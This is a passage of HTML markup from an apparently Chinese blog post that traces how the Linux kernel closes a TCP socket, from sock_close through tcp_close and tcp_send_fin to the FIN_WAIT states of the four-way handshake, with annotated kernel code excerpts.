!important;\">\nsock_close\r\n\t|-sock_release\r\n\t\t|-sock-&gt;ops-&gt;release(sock);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f942391287335-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f942391287335-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f942391287335-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f942391287335-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f942391287335-1\"><span class=\"crayon-v\">sock_close</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f942391287335-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">sock_release</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f942391287335-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">sock</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">ops</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">release</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sock</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f942391287335-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>在上一篇博客中，我们知道sock-&gt;ops为下图所示: <img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/e8301ae3d8b1b1e049945028720a65fc.png\" alt=\"输入图片说明\"><br>\n即(在这里我们仅考虑tcp,即sk_prot=tcp_prot):</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f945548779156\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninet_stream_ops-&gt;release\r\n\t|-inet_release\r\n\t\t\t|-sk-&gt;sk_prot-&gt;close(sk, timeout);\r\n\t\t\t\t|-tcp_prot-&gt;close(sk, timeout);\r\n\t\t\t\t\t|-&gt;tcp_prot.tcp_close\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f945548779156-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f945548779156-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f945548779156-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f945548779156-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f945548779156-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f945548779156-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f945548779156-1\"><span class=\"crayon-v\">inet_stream_ops</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">release</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f945548779156-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">inet_release</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f945548779156-3\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_prot</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f945548779156-4\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tcp_prot</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f945548779156-5\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">tcp_prot</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tcp</span><span class=\"crayon-sy\">_</span>close</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f945548779156-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>关于fd与socket的关系如下图所示:<br>\n<img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/6eb9eee079192bdc1bf19c733558e94c.png\" alt=\"输入图片说明\"><br>\n上图中红色线标注的是close(fd)的调用链</p>\n<h3>tcp_close</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f948665312679\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid tcp_close(struct sock *sk, long timeout)\r\n{\r\n\tif (sk-&gt;sk_state == TCP_LISTEN) {\r\n\t\t// 如果是listen状态，则直接设为close状态\r\n\t\ttcp_set_state(sk, TCP_CLOSE);\r\n\t}\r\n\t// 清空掉recv.buffer\r\n\t......\r\n\t// SOCK_LINGER选项的处理\r\n\t......\r\n\telse if (tcp_close_state(sk)){\r\n\t\t// tcp_close_state会将sk从established状态变为fin_wait1\r\n\t\t// 发送fin包\r\n\t\ttcp_send_fin(sk);\r\n\t}\r\n\t......\r\n}\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f948665312679-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f948665312679-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_LISTEN</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 如果是listen状态，则直接设为close状态</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tcp_set_state</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_CLOSE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 清空掉recv.buffer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// SOCK_LINGER选项的处理</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">tcp_close_state</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-12\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// tcp_close_state会将sk从established状态变为fin_wait1</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-13\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 发送fin包</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-14\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tcp_send_fin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-15\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-16\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-17\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f948665312679-18\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670f9f948665312679-19\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p></p>\n<h3>四次挥手</h3>\n<p>现在就是我们的四次挥手环节了，其中上半段的两次挥手下图所示:<br>\n<img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/4695ad082e389948bfa32684c6ca62ea.png\" alt=\"输入图片说明\"><br>\n首先，在tcp_close_state(sk)中已经将状态设置为fin_wait1,并调用tcp_send_fin</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f94c538372621\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid tcp_send_fin(struct sock *sk)\r\n{\r\n\t......\r\n\t// 这边设置flags为ack和fin\r\n\tTCP_SKB_CB(skb)-&gt;flags = (TCPCB_FLAG_ACK | TCPCB_FLAG_FIN);\r\n\t......\r\n\t// 发送fin包，同时关闭nagle\r\n\t__tcp_push_pending_frames(sk, mss_now, TCP_NAGLE_OFF);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94c538372621-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94c538372621-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94c538372621-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94c538372621-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94c538372621-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94c538372621-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94c538372621-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94c538372621-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94c538372621-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94c538372621-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f94c538372621-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_send_fin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94c538372621-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94c538372621-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94c538372621-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 这边设置flags为ack和fin</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94c538372621-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">TCP_SKB_CB</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">flags</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">TCPCB_FLAG_ACK</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCPCB_FLAG_FIN</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94c538372621-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94c538372621-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 发送fin包，同时关闭nagle</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94c538372621-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">__tcp_push_pending_frames</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mss_now</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_NAGLE_OFF</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94c538372621-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94c538372621-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>如上图Step1所示。 接着，主动关闭的这一端等待对端的ACK，如果ACK回来了，就设置TCP状态为FIN_WAIT2,如上图Step2所示,具体代码如下:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f94f080699720\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntcp_v4_do_rcv\r\n\t|-tcp_rcv_state_process\r\nint tcp_rcv_state_process(struct sock *sk, struct sk_buff *skb, struct tcphdr *th, unsigned len)\t\r\n{\r\n\t......\r\n\t/* step 5: check the ACK field */\r\n\tif (th-&gt;ack) {\r\n\t\t...\r\n\t\tcase TCP_FIN_WAIT1:\r\n\t\t\t// 这处判断是确认此ack是发送Fin包对应的那个ack\r\n\t\t\tif (tp-&gt;snd_una == tp-&gt;write_seq) {\r\n\t\t\t\t// 设置为FIN_WAIT2状态\r\n\t\t\t\ttcp_set_state(sk, TCP_FIN_WAIT2);\r\n\t\t\t\t......\r\n\t\t\t\t// 设定TCP_FIN_WAIT2定时器，将在tmo时间到期后将状态变迁为TIME_WAIT\r\n\t\t\t\t// 不过是这时候改的已经是inet_timewait_sock了\r\n\t\t\t\ttcp_time_wait(sk, TCP_FIN_WAIT2, tmo);\r\n\t\t\t\t......\r\n\t\t\t}\r\n\t}\r\n\t/* step 7: process the segment text */\r\n\tswitch(sk-&gt;sk_state) {\r\n\tcase TCP_FIN_WAIT1:\r\n\tcase TCP_FIN_WAIT2:\r\n\t\t......\r\n\tcase TCP_ESTABLISHED:\r\n\t\ttcp_data_queue(sk, skb);\r\n\t\tqueued = 1;\r\n\t\tbreak;\r\n\t}\r\n\t.....\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-13\">13</div><div class=\"crayon-num crayon-striped-num\" 